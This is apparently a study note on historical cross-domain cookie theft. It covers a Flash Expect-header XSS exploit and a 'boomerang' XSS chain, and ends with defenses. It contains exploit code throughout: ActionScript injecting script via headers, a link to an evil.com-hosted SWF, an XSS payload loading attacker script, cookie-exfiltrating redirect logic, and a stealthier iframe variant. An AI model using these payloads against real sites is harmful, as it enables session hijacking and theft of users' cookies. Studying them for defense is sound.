# 14 - Cross-Domain Cookie Theft: Flash Expect Header + Boomerang XSS

## Part 1: Flash-Based Expect Header Injection

### The Problem

XSS via the `Expect` header (see note 13) is hard to exploit because browsers don't let you set arbitrary HTTP headers through normal navigation. Flash (ActionScript) solved this for attackers.

### The Flash Exploit (by Amit Klein)

```actionscript
inURL = this._url;
inPOS = inURL.lastIndexOf("?");
inParam = inURL.substring(inPOS + 1, inPOS.length);
req = new LoadVars();
req.addRequestHeader("Expect", "<script>alert('" + inParam + " is vulnerable to the Expect Header vulnerability.');</script>");
req.send(inParam, "_blank", "POST");
```

The SWF file reads the target URL from its own query string, then sends a POST request with a malicious `Expect` header. The attacker hosts the SWF and links to it:

```
http://www.evil.com/exploit.swf?http://www.target.com/
```

Flash allowed setting custom HTTP headers on requests — including headers like `Expect` that browsers normally control. The target server reflects the header in its 417 error page, and the script executes in the target's origin.

### CRLF Injection via Flash Headers

Flash also allowed injecting entirely new headers by embedding CRLF sequences:

```actionscript
req.addRequestHeader("Expect:FooBar", "<script>alert('XSS')</script>");
```

The colon in the header name could trick some HTTP parsers. Combined with CRLF characters, attackers could inject arbitrary headers or even split the HTTP response — enabling HTTP response splitting attacks.

## Part 2: Boomerang Attack — Stealing Third-Party Cookies

### The Concept

The boomerang technique steals cookies from a third-party site (`b.com`) by exploiting an XSS vulnerability on that site, then redirects the victim back to the attacker's page (`a.com`) — the victim barely notices anything happened.

### Prerequisites

- An XSS vulnerability on `b.com` (the target whose cookies you want)
- The attacker controls `a.com` (or has XSS there)

### The Attack Flow

```
Victim visits a.com
       │
       ▼
a.com redirects to b.com with XSS payload
       │
       ▼
XSS executes on b.com, steals b.com's cookies
       │
       ▼
b.com redirects back to a.com (boomerang)
       │
       ▼
Victim is back on a.com — barely noticed the round trip
```

### Implementation

#### Step 1: XSS Payload Targeting b.com

```javascript
var target = "http://www.b.com/xssDemo.html#'><script src=http://www.a.com/anehta/feed.js></script><'";
var org_url = "http://www.a.com/anehta/demo.html";
```

The target URL contains a DOM-based XSS payload in the fragment (`#`). When `b.com` renders the page, the injected `<script>` loads `feed.js` from `a.com` — the attacker's payload framework.

#### Step 2: The Boomerang Module

```javascript
// Boomerang module — steal third-party cookies
// then redirect back to the original page
// Requires an XSS on the remote site

var target_domain = target.split('/')[2];
var org_domain = org_url.split('/')[2];

if (document.domain == org_domain) {
  // We're on a.com — redirect to the target
  if (anehta.dom.checkCookie("boomerang") == false) {
    // Cookie marker ensures we only bounce once
    anehta.dom.addCookie("boomerang", "x");
    setTimeout(function() {
      anehta.net.postForm(target);
    }, 0);
  }
}

if (document.domain == target_domain) {
  // We're on b.com — steal cookies and bounce back
  anehta.logger.logCookie();
  setTimeout(function() {
    anehta.net.postForm(org_url);
  }, 50);
}
```

The same script runs on both domains:
1. On `a.com`: sets a cookie marker to prevent infinite loops, then redirects to `b.com` with the XSS payload
2. On `b.com`: the XSS fires, `logCookie()` exfiltrates `b.com`'s cookies to the attacker's server, then redirects back to `a.com`

The cookie marker (`boomerang=x`) ensures the loop only executes once — without it, the victim would bounce back and forth forever.

### Using an iframe Instead

The redirect can also happen silently via an iframe:

```html
<iframe src="http://www.b.com/?xss_payload_here"></iframe>
```

This is stealthier — the victim stays on `a.com` while the iframe loads `b.com`, triggers the XSS, and exfiltrates cookies in the background. No visible navigation occurs.

## Key Takeaways

- Flash was a major XSS enabler because it could set arbitrary HTTP headers and make cross-origin requests — capabilities browsers intentionally restricted
- The boomerang technique chains two XSS vulnerabilities (or one XSS + one controlled page) to steal cookies across domains
- The cookie marker pattern prevents infinite redirect loops — a practical detail that matters in real exploit development
- iframe-based boomerang is stealthier than redirect-based because the victim never leaves the attacker's page

## Defenses

- `HttpOnly` cookies — prevents JavaScript from reading cookies even when XSS is achieved
- `SameSite` cookie attribute — prevents cookies from being sent in cross-site contexts
- Content Security Policy — `frame-src` restricts which origins can be loaded in iframes
- Flash is dead — modern browsers no longer support Flash, eliminating the header injection vector
- Fix XSS vulnerabilities — the boomerang attack requires an XSS on the target site
